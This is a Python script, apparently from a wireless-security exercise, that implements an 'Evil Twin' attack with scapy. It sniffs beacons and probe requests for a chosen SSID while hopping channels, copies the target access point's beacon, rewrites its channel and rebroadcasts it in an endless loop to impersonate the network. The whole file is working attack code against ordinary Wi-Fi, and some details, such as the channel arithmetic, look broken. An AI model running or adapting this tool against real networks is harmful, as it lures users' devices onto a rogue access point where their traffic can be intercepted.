#python3
import argparse
import numpy as np
from scapy.all import *
from threading import Thread
import pandas
import time
import os
from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump

parser = argparse.ArgumentParser(prog="Evil Twin attack",
                                 usage=" python3 evilTwin.py -i [interface] -s [secondes] -SSID [wifi_SSID]\n",
                                 allow_abbrev=False)
parser.add_argument("-i", "--Interface", required=True, help="Interface from which you want to send packets, needs to be set to monitor mode ")
parser.add_argument("-s", "--Second", required=True, help="Number of second you will monitor packets")
parser.add_argument("-SSID", required=True, help="SSID of the wifi (if found) will be targeted")

args = parser.parse_args()

# Initialize the networks that will contain STAs that are looking for the targeted AP
# initialize the networksBeacon dataframe that will contain AP targeted

networks = pandas.DataFrame(columns=["STA MAC", "searched SSID"])
networksBeacon = pandas.DataFrame(columns=["BSSID", "SSID", "Packet"])

# set the index for both dataFrame
networks.set_index("STA MAC", inplace=True)
networksBeacon.set_index("BSSID", inplace=True)

def callback(packet):
    i = 0
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it and its strength
        ssid = packet[Dot11Elt].info.decode()
        # if the ssid correspond to the one targeted 
        if(ssid == args.SSID):
            networksBeacon.loc[bssid] = (ssid, packet)      

    if packet.haslayer(Dot11ProbeReq):
        # extract the STA address of the network
        mac = str(packet.addr2)
        ssid = packet.info.decode()                             
        if (ssid == args.SSID):
            networks.loc[mac] = (str(args.SSID))    

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)


def create_packet(packet):
    #hexdump(packet)
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # calculate the new channel
        newChannel = (channel + 6) % 11
        # get the end of the original packet
        oldEltend = packet[Dot11Elt][3]
        # get the content of original packet
        newPacket = packet
        # change the DSset to the new calculate value. This will clear everything that follows 
        newPacket[Dot11Elt][2] = Dot11Elt(ID='DSset', info=chr(newChannel), len=1) 
        # concatenate the end of the packet with what we created before
        finalPacket = newPacket/oldEltend
        # send the packet until user stop it
        sendp(finalPacket, iface=args.Interface, inter=0.10, loop=1)

                

if __name__ == "__main__":
    # interface name, check using iwconfig and pass it with -i argument
    interface = args.Interface    

    # the channel changer has been taken from : https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
    # the callback function has been inspired by it as well
    # start the channel changer 
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # start sniffing
    print("Sniffing for " + str(args.Second) + " seconds, please wait\n")
    sniff(prn=callback, iface=interface, timeout=int(args.Second))

    # Recover corresponding packet of the selected wifi
    packet = networksBeacon.values[0][1]

    create_packet(packet)
